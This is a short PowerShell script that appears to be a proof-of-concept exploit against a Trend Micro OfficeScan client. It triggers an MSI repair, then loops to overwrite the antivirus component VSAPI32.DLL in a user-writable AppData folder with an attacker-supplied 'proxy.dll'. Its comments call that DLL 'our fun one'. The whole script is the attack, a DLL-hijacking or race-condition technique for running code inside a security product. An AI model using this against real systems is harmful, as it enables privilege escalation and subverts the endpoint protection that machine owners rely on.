$path = 'C:\Users\pk\AppData\Local\Trend Micro\OfficeScan Client'
Write-Host "Running the MSI file"
Start-Process -FilePath 'msiexec.exe' -ArgumentList '/fa C:\Users\pk\Desktop\11564_ari_Stdsrv.msi'
Write-Host "Done, now DIR'ing 'C:\Users\pk\AppData\Local\Trend Micro\OfficeScan Client'"

$result = Get-ChildItem -Path 'C:\Users\pk\AppData\Local\Trend Micro\OfficeScan Client' -Recurse -Force -Name -Include 'VSAPI32.DLL'


Write-Host $result
$count = 1
While ($result) {
    Write-Host 'File present, now running copy loop'
    #$size=(Get-Item 'C:\Users\pk\AppData\Local\Trend Micro\OfficeScan Client\LocalSupportFiles\VSAPI32.DLL').length/1024
    #if($size -gt 86){
        #$count =+ 1
    #Write-Host 'Looks like our dll got overwritten, swapping with our fun one'
    #Copy-Item 'C:\Users\pk\AppData\Local\Trend Micro\OfficeScan Client\LocalSupportFiles\VSAPI32.DLL' 'C:\Users\pk\AppData\Local\Trend Micro\OfficeScan Client\LocalSupportFiles\VSAPI32.DLL.bak'
    Copy-Item 'C:\Users\pk\Desktop\proxy.dll' 'C:\Users\pk\AppData\Local\Trend Micro\OfficeScan Client\LocalSupportFiles\VSAPI32.DLL'
    }



